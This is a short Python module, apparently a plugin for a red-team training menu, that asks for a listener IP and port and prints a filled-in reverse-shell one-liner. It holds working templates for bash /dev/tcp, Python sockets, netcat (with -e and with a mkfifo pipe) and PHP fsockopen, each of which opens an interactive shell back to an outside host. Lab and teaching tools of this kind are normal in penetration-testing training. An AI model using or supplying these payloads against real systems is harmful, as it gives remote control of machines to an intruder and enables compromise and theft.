NAME = "Reverse Shell Reference"
DESCRIPTION = "Generate lab reverse-shell one-liners (display only)."
ALLOWED_ROLES = ["admin", "instructor"]

TEMPLATES = {
    "1": ("Bash", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
    "2": ("Python", "python3 -c 'import socket,os;s=socket.socket();"
           "s.connect((\"{lhost}\",{lport}));"
           "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
           "os.system(\"/bin/bash -i\")'"),
    "3": ("Netcat (traditional)", "nc -e /bin/bash {lhost} {lport}"),
    "4": ("Netcat (no -e)", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1"
           "|nc {lhost} {lport} >/tmp/f"),
    "5": ("PHP", "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
           "exec(\"/bin/bash -i <&3 >&3 2>&3\");'"),
}


def run(username, role):
    lhost = input("Listener IP (LHOST): ").strip()
    lport = input("Listener port (default 4444): ").strip() or "4444"
    if not lhost:
        return

    print("\nPayload types:")
    for key, (name, _) in TEMPLATES.items():
        print(f"  {key}. {name}")
    choice = input("Select: ").strip()

    if choice not in TEMPLATES:
        print("[!] Invalid choice.")
        return

    name, template = TEMPLATES[choice]
    print(f"\n--- {name} ---")
    print(template.format(lhost=lhost, lport=lport))
    print(f"\n[*] Start a listener first: Red Team menu -> Catch Listener ({lport})")
